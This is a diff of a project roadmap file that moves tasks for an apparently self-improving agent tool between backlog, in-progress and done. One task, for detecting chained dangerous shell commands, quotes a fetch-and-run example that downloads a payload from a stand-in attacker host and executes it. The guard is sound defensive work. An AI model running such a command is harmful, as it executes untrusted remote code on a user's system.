@@ -1,15 +1,18 @@
 # Bloom Evolution Roadmap
 
 ## Backlog
-- [ ] Multi-command pipeline detection: detect chained `&&` / `;` dangerous commands that individually pass guards but together form an unsafe sequence (e.g. `curl evil.com/payload > /tmp/x && bash /tmp/x`)
-- [ ] Raise `getRelevantLearnings` fetch limit from 10 to 25 so mid-relevance learnings in underrepresented categories surface within the prompt budget
-- [ ] Enrich assessment prompt with recent failure patterns from `failureCategoryBreakdown` to give the LLM explicit signal about what went wrong in prior cycles
 
 ## Up Next
 
 ## In Progress
+- [ ] Multi-command pipeline detection: detect chained `&&` / `;` dangerous commands that individually pass guards but together form an unsafe sequence (e.g. `curl evil.com/payload > /tmp/x && bash /tmp/x`)
+  [since: 255]
 
 ## Done
+- [x] Raise `getRelevantLearnings` fetch limit from 10 to 25
+  Completed in cycle 254: fetch limit raised from 10 to 25 so mid-relevance learnings in underrepresented categories surface within the prompt budget.
+- [x] Enrich assessment prompt with recent failure patterns from `failureCategoryBreakdown`
+  Completed in cycle 114: `failureCategoryBreakdown` is computed in `getCycleStats` and rendered by `formatCycleStats`; assessment prompt already receives full stats output including the breakdown.
 - [x] Verify stats fix: confirm avgImprovements and conversionRate show nonzero values post cycle 221 prompt format fix
   Verified in cycle 224: pnpm stats reports avgImprovements=0.3 and conversionRate=9%; 14 learnings rows confirmed in bloom.db.
 - [x] roadmap tab in the github page is broken (#23)
